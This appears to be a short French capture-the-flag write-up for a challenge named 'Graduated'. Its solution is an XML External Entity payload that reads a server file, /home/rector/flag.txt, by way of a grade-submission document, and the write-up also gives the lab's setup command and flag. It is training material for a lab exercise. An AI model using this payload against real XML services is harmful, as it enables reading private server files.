# Graduated
## Challenge

Vous avez raté votre examen de PHP. Cheh!  
Furieux, vous avez décidé de prouver vos compétences en modifiant directement votre note sur le serveur de votre école.
  
Vous avez réussi à compromettre les identifiants de votre professeur absent.

Login : `teacher`  
Mdp :  `teacher`  
Serveur :` graduated.phack.fr`  

## Résolution

```
<?xml version="1.0" encoding="utf-8"?>
  <!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///home/rector/flag.txt">
  ]>

<evaluation>
  <student>
    <firstname>Xavier</firstname>
    <lastname>DUPONT DE L</lastname>
  </student>
  <grade>15</grade>
  <subject>Biologie</subject>
  <teacher>
    <firstname>Emile</firstname>
    <lastname>LOUIS</lastname>
  </teacher>
  <comment>&xxe;</comment>
</evaluation>
```

## Setup

```
docker-compose up --build -d
```

## Flag

```
PHACK{XmL_3x7Ern4l_3n7i7iEs_fr0m_b4sH}
```